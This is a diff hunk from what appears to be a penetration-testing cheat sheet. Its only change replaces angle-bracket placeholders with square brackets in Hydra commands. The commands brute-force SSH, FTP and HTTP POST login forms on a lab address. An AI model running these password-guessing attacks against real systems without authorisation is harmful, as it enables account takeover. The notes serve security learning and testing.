@@ -81,18 +81,18 @@ exist GUI and CLI mode
 
 :: SSH brute force
 
-# hydra -l <username> -p <password> 10.10.10.1 -t 50  ssh
+# hydra -l [username] -p [password] 10.10.10.1 -t 50  ssh
 
 :: FTP brute force
 
-# hydra -l <username> -p <password> ftp://10.10.10.1
+# hydra -l [username] -p [password] ftp://10.10.10.1
 
 :: HTTP-POST-FORM
 
-# hydra -l <username> -P <wordlist> 10.10.10.1 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+# hydra -l [username] -P [wordlist] 10.10.10.1 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 
-# hydra -l <username> -P <wordlist> 10.10.10.1 http-post-form "/<login_page>:username=^USER^&password=^PASS^:message" -V
-# hydra -l <username> -P <wordlist> 10.10.10.1 http-post-form "/login.php:username=^USER^&password=^PASS^:message" -V
+# hydra -l [username] -P [wordlist] 10.10.10.1 http-post-form "/<login_page>:username=^USER^&password=^PASS^:message" -V
+# hydra -l [username] -P [wordlist] 10.10.10.1 http-post-form "/login.php:username=^USER^&password=^PASS^:message" -V
 
 ^USER^ = variable used to use the users provided
 ^PASS^ = variable used to use the passwords provided
